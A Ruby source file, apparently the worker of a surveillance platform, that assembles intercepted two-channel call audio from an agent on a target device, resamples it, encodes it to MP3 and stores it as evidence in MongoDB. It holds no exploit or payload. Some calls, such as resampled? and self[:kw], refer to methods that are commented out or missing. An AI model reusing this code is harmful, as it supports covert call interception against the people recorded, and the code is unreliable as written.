require 'ffi'
require 'mongo'
require 'mongoid'
require 'stringio'
require 'digest/md5'

require 'rcs-common/trace'

require_relative 'speex'
require_relative 'wave'
require_relative 'src'
require_relative 'mp3lame'

module RCS
module Worker

class AudioProcessingError < StandardError
  attr_reader :msg
  def initialize(msg)
    @msg = msg
  end

  def to_s
    @msg
  end
end

class Channel
  include Tracer
  attr_reader :name, :sample_rate, :start_time, :written_samples, :wav_data, :status
  
  def initialize(evidence)
    @id = BSON::ObjectId.new
    @name = evidence[:data][:channel].to_s
    @sample_rate = evidence[:data][:sample_rate]
    @start_time = evidence[:data][:start_time]
    @written_samples = 0
    @needs_resampling = @sample_rate
    #@resampled = false
    @wav_data = Array.new # array of 32 bit float samples
    @status = :open
    trace :debug, "[channel #{to_s}] ceating new channel #{@name} - start_time: #{@start_time} sample_rate: #{@sample_rate}"
  end
  
  def id
    "#{@name}:#{@sample_rate}:#{@start_time.to_f}:#{@written_samples.to_f}:#{@status.to_s}"
  end
  
  def self.other_than channel
    channel == :incoming ? :outgoing : :incoming
  end
  
  def close!
    @status = :closed
    trace :debug, "[channel #{to_s}] closing channel #{self.id}"
  end
  
  def closed?
    @status == :closed
  end

=begin
  def resampled?
    @resampled
  end
=end

  def needs_resampling?
    @needs_resampling != @sample_rate
  end

  def resample_channel(sample_rate)
    return if sample_rate == @sample_rate
    @needs_resampling = sample_rate
    trace :debug, "[channel #{to_s}] resampling channel from #{@sample_rate} to #{@needs_resampling}"
    @wav_data = SRC::Resampler.new(@needs_resampling).resample_channel(@wav_data, @sample_rate)
    #@resampled = true
    @written_samples = @wav_data.size
  end

  def resample(evidence)
    return evidence if @needs_resampling == @sample_rate
    evidence[:wav] = SRC::Resampler.new(@needs_resampling).resample_channel evidence[:wav], @sample_rate
    trace :debug, "[channel #{to_s}:resample] evidence wav resampled to #{evidence[:wav].size} frames @ #{@needs_resampling}"
    evidence
  end

  def fill(evidence)
    expected = expected_samples(evidence)
    samples_to_fill = expected - @written_samples
    seconds_to_fill = samples_to_fill / @needs_resampling
    trace :debug, "[channel #{to_s}] filling with #{samples_to_fill} samples(@#{@needs_resampling}) to fill #{seconds_to_fill} seconds of missing data."
    return if samples_to_fill <= 0
    @wav_data.concat [0.0] * samples_to_fill
    @written_samples = expected
  end

  def fill_begin(time_gap)
    @wav_data.concat [0.0] * (time_gap * @needs_resampling)
  end

  def expected_samples(evidence)
    samples = (evidence[:data][:start_time].to_f - @start_time.to_f) * @needs_resampling
    samples
  end

  def time_gap(evidence)
    expected = expected_samples(evidence)
    (expected - @written_samples) / @needs_resampling
  end

  def accept?(evidence)
    if closed? 
      trace :debug, "[channel #{to_s}] channel is closed, refusing ..."
      return false
    end

    gap = time_gap(evidence)
    if gap >= 5.0
      trace :debug, "[channel #{to_s}] time gap is more than 5 seconds (#{gap}), refusing ..."
      return false
    end
    return true
  end

  def feed(evidence)
    fill evidence
    @written_samples += evidence[:wav].size
    @wav_data.concat evidence[:wav]
    @duration = @written_samples / @needs_resampling
  end

  def num_frames
    @wav_data.size
  end

  def to_s
    "#{@id}:#{name}:#{sample_rate}:#{wav_data.size}"
  end
end

class Call
  include Tracer
  attr_writer :start_time
  attr_reader :bid, :id, :peer, :duration, :sample_rate, :raw_ids, :evidence, :raw_counter

  def initialize(peer, program, start_time, agent, target)
    @bid = BSON::ObjectId.new
    @id = "#{agent[:ident]}_#{agent[:instance]}_#{@bid}"
    @peer = peer
    @start_time = start_time
    @status = :queueing
    @channels = {}
    @program = program
    @duration = 0
    trace :info, "[CALL #{@id}] created new call for #{@peer}, starting at #{@start_time}"
    @raw_counter = 0
    @sample_rate = nil

    @agent = agent
    @target = target

    @evidence = nil
  end

  def id
    "#{@peer}:#{@start_time.to_f}"
  end

  def single_channel?
    @status == :single_channel
  end

  def dual_channel?
    @status == :dual_channel
  end

  def queueing?
    @status == :queueing
  end

  def accept?(evidence)
    # peer must be the same!
    return false if evidence[:data][:peer] != @peer

    # we accept evidence only if relative channel accept it
    channel = get_channel evidence
    return true unless channel.nil?
    return false
  end
  
  def get_channel(evidence)
    channel = @channels[evidence[:data][:channel]] 
    channel ||= create_channel(evidence)
    return channel if channel.accept? evidence
    return nil
  end

  def num_channels
    @channels.values.size
  end
  
  def create_channel(evidence)
    @channels[evidence[:data][:channel]] ||= Channel.new evidence

    # fix start time
    a = channels_by_start_time
    @start_time = a[0].start_time

    # when we have both channels
    trace :debug, "we have #{num_channels} channels now #{@channels.values.collect {|c| c.to_s}}"

    if num_channels == 2
      #determine common sample rate
      @sample_rate = (@channels.values.min_by {|c| c.sample_rate}).sample_rate

      #resample channels (if necessary)
      @channels.values.each {|c| c.resample_channel(@sample_rate) unless c.resampled?}

      # fill in later channel
      fillin_gap = a[1].start_time - a[0].start_time
      #trace :debug, "[CALL #{@id}] FILLING #{fillin_gap.to_f} SECS ON CHANNEL #{a[1].name}"
      a[1].fill_begin(fillin_gap)
    end

    return @channels[evidence[:data][:channel]]
  end

  def close!
    # TODO: flush channels if samples queued
    @channels.each_value {|c| c.close!}
    update_data({status: :completed}) #unless @evidence.nil?
    trace :debug, "[CALL #{@id}] closing call for #{@peer}, starting at #{@start_time}"
    true
  end
  
  def closed?
    return false if @channels.size == 0
    closed_channels = @channels.select {|k,v| v.closed? unless v.nil? }
    return closed_channels.size == @channels.size
  end
  
  def feed(evidence)
    
    @raw_counter += 1
    
    # if evidence is empty or call is closed, refuse feeding
    return false if closed?

    # get the correct channel for the evidence
    channel = get_channel(evidence)
    #return false if channel.nil?

    evidence = channel.resample evidence if channel.needs_resampling?
    
    trace :debug, "[CALL #{@id}] feeding #{evidence[:wav].size} frames at #{evidence[:data][:start_time]}:#{evidence[:data][:written_samples]} to #{channel.id}"
    channel.feed evidence
    
    # update status
    update_status

    unless queueing?
      if dual_channel?
        @evidence ||= store @peer, @program, @start_time, @agent, @target

        num_samples = [@channels[:outgoing].wav_data.size, @channels[:incoming].wav_data.size].min
        @duration += (1.0 * num_samples) / @sample_rate

        left_pcm = @channels[:outgoing].wav_data.shift num_samples
        right_pcm = @channels[:incoming].wav_data.shift num_samples

        yield @sample_rate, left_pcm, right_pcm
      elsif single_channel?
        @evidence ||= store @peer, @program, @start_time, @agent, @target

        channel = @channels.values[0]
        num_samples = channel.wav_data.size
        @duration += (1.0 * num_samples) / channel.sample_rate

        left_pcm = channel.wav_data.shift(channel.wav_data.size)
        right_pcm = Array.new left_pcm

        yield channel.sample_rate, left_pcm, right_pcm
      end
    end

    return true
  end
  
  def flush_on_close
    # if status is not defined, define it with the information we have
    if queueing?
      @status = :single_channel if num_channels == 1
      @status = :dual_channel if num_channels == 2
    end
    
    if dual_channel?
      @evidence ||= store @peer, @program, @start_time, @agent, @target

      num_samples = [@channels[:outgoing].wav_data.size, @channels[:incoming].wav_data.size].min

      left_pcm = @channels[:outgoing].wav_data.shift num_samples
      right_pcm = @channels[:incoming].wav_data.shift num_samples

      @duration += (1.0 * num_samples) / @sample_rate

      yield @sample_rate, left_pcm, right_pcm
    elsif single_channel?
      @evidence ||= store @peer, @program, @start_time, @agent, @target

      channel = @channels.values[0]

      left_pcm = channel.wav_data.shift(channel.wav_data.size)
      right_pcm = Array.new left_pcm

      @duration += (1.0 * channel.wav_data.size) / channel.sample_rate

      yield channel.sample_rate, left_pcm, right_pcm
    end
  end

  def update_data(hash)
    @evidence.update_attributes(@evidence.data.merge!(hash)) unless @evidence.nil?
  end

  def store(peer, program, start_time, agent, target)

    coll = ::Evidence.collection_class(target[:_id].to_s)
    coll.create do |ev|
      ev._id = @bid
      ev.aid = agent[:_id].to_s
      ev.type = :call
      
      ev.da = start_time
      ev.dr = Time.now.to_i
      ev.rel = 0
      ev.blo = false
      ev.note = ""
      
      ev.data ||= Hash.new
      ev.data[:peer] = peer
      ev.data[:program] = program
      ev.data[:duration] = 0
      ev.data[:status] = :recording

      # update the evidence statistics
      # TODO: where do we add the size to the stats? (probably in the same place where we will forward to connectors)
      RCS::Worker::StatsManager.instance.add evidence: 1

      # keyword full search
      ev.kw = self[:kw]

      ev.save
      ev
    end
  end
  
  def file_name
    "#{@id}_#{@peer}_#{@program}"
  end

  def sample_rates
    @channels.values.collect {|c| c.sample_rate}
  end

  def min_sample_rate
    sample_rates.sort.first
  end
  
  def update_status
    case num_channels
      when 1
        channel = @channels.values[0]
        gap = (1.0 * channel.written_samples) / channel.sample_rate
        @status = :single_channel if gap > 15
        trace :debug, "[CALL #{@id}] call status is #{@status}, channel #{channel.name} gap is #{gap}"
      when 2
        @status = :dual_channel
        trace :debug, "[CALL #{@id}] call status is #{@status}"
    end
  end

  def channels_by_start_time
    @channels.values.minmax_by {|c| c.start_time }
  end
end

class CallProcessor
  include Tracer

  def initialize
    @call = nil
  end

  def get_call(evidence)
    # if peer is unknown, evidence is invalid, ignore it
    return nil if evidence[:data][:peer].empty?

    # first call, create it
    if @call.nil?
      @call = create_call(evidence)
      return @call
    end

    # if we have a call and accepts the evidence, that's the good one
    return @call if @call.accept? evidence and not @call.closed?

    # otherwise, close the call
    close_call
    @call = create_call(evidence)
    @call
  end

  def close_call
    return if @call.nil?
    @call.close!
    yield @call.evidence if block_given?
  end

  def create_call(evidence)
    Call.new(evidence[:data][:peer], evidence[:data][:program], evidence[:data][:start_time], @agent, @target)
  end

  def end_call?(evidence)
    evidence[:end_call]
  end
  
  def feed(evidence, agent, target)
    @agent = agent
    @target = target

    if end_call? evidence
      close_call {|evidence| yield evidence}
      @call = nil
      return nil, 0
    end
    
    call = get_call(evidence)
    return nil if call.nil?
    
    call.feed evidence do |sample_rate, left_pcm, right_pcm|
      encode_mp3(sample_rate, left_pcm, right_pcm) do |mp3_bytes|
        #File.open("#{call.file_name}.mp3", 'ab') {|f| f.write(mp3_bytes) }
        write_to_grid(call, mp3_bytes)
      end
    end
    return call.bid, call.raw_counter
  end
  
  def encode_mp3(sample_rate, left_pcm, right_pcm)
    @encoder ||= ::MP3Encoder.new(2, sample_rate)
    unless @encoder.nil?
      @encoder.feed(left_pcm, right_pcm) do |mp3_bytes|
        yield mp3_bytes
      end
    end
  end
  
  def write_to_grid(call, mp3_bytes)
    db = Mongoid.database
    fs = Mongo::GridFileSystem.new(db, "grid.#{@target[:_id]}")

    fs.open(call.file_name, 'a') do |f|
      f.write mp3_bytes
      call.update_data({_grid: f.files_id, _grid_size: f.file_length, duration: call.duration})
    end
  end

  def to_s
    @call.to_s
  end
end

end # Worker::
end # RCS::
